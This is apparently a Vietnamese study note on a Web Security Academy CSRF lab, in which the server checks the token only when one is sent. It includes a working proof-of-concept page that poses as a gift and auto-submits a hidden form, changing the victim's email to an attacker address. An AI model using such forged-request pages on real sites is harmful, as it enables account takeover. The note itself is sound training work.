## CSRF nơi xác thực token phụ thuộc vào sự hiện diện của token
* Đây là 1 lỗi logic khá là buồn cười của lập trình viên. Họ đã thiết kế hệ thống kiểm tra bảo mật token nhưng lại để quên 1 lỗ hổng sơ đẳng
* TH1: Là nếu bạn có token nhưng token sai -> hệ thống kiểm tra lỗi, không cho vào.
* TH2: Là nếu bạn không quẹt thẻ cứ thế đẩy cửa đi vào. Hệ thống không thấy thể, không kiểm tra nữa và cho qua luôn.
``` html
<html>
  <body>
    <h1>Bạn nhận được một món quà!</h1>
    <form action="https://0a30002f04c0eb92806a0d76007b0052.web-security-academy.net/my-account/change-email" method="POST" id="hack-form">
      <input type="hidden" name="email" value="hacker-level3@evil-user.net" />
    </form>
    <script>
      // Tự động submit form
      document.getElementById('hack-form').submit();
    </script>
  </body>
</html>
```
